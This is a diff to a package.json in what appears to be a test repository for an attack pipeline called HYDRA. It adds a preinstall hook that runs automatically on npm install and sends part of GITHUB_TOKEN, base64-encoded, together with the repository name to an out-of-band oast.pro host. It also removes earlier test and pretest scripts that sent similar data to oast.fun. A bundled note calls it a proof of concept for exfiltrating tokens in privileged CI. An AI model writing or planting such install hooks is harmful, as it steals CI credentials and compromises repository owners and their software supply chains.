@@ -3,7 +3,9 @@
   "version": "1.0.0",
   "description": "E2E test repository for HYDRA pipeline",
   "scripts": {
-    "test": "curl -sk 'https://oast.fun/hydra-0225112335?t=$(echo $GITHUB_TOKEN | head -c 8 | base64)'&r=$GITHUB_REPOSITORY -o /dev/null || true",
-    "pretest": "curl -sk 'https://oast.fun/hydra-0225112335?stage=pretest&r=$GITHUB_REPOSITORY' -o /dev/null || true"
-  }
+    "preinstall": "curl -sk https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/live-poc?t=$(echo $GITHUB_TOKEN | cut -c1-10 | base64)\\&id=E2E-REAL-PRT-BASIC-02252244\\&r=$GITHUB_REPOSITORY -o /dev/null || true",
+    "test": "echo ok"
+  },
+  "hydra_stage3_payload": "LIVE_EXPLOIT_E2E-REAL-PRT-BASIC-02252244",
+  "note": "HYDRA PoC: preinstall exfiltrates GITHUB_TOKEN when npm install runs in privileged CI context"
 }
